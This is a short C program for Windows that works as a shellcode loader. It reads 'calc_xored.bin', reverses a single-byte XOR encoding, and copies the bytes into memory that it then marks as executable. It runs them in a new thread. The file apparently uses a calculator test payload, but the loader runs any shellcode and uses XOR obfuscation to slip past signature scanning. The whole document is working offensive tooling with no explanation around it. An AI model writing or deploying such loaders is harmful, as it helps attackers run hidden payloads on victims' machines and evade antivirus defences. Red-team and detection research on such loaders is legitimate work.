#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void read(const char *filename, char **buffer, int *fileLen) {
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        fprintf(stderr, "Could not open file %s\n", filename);
        exit(1);
    }

    fseek(file, 0, SEEK_END);
    *fileLen = ftell(file);
    fseek(file, 0, SEEK_SET);

    *buffer = (char *)malloc(*fileLen + 1);
    if (*buffer == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        fclose(file);
        exit(1);
    }

    fread(*buffer, 1, *fileLen, file);
    fclose(file);

    (*buffer)[*fileLen] = '\0';
}

void xor(char *buffer, int fileLen){
    for (int i = 0; i < fileLen; i++){
        buffer[i] ^=1;
    }
}

int main() {
    char *buffer;
    int fileLen;
    DWORD old;

    read("calc_xored.bin", &buffer, &fileLen);

    printf("File contents:\n");
    for (int i = 0; i < fileLen + 1; i++) {
        printf("%x ", (unsigned char)buffer[i]);
    }
    printf("\n");
    xor(buffer, fileLen);
    printf("File content after unXORing:\n");
     for (int i = 0; i < fileLen + 1; i++) {
        printf("%x ", (unsigned char)buffer[i]);
    }
    void *exec = VirtualAlloc(0, fileLen, MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, buffer, fileLen);
    VirtualProtect(exec, fileLen, PAGE_EXECUTE_READ, &old);
    

    HANDLE foo = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    WaitForSingleObject(foo, INFINITE);

    free(buffer);
    VirtualFree(exec, 0, MEM_RELEASE);
    return 0;
}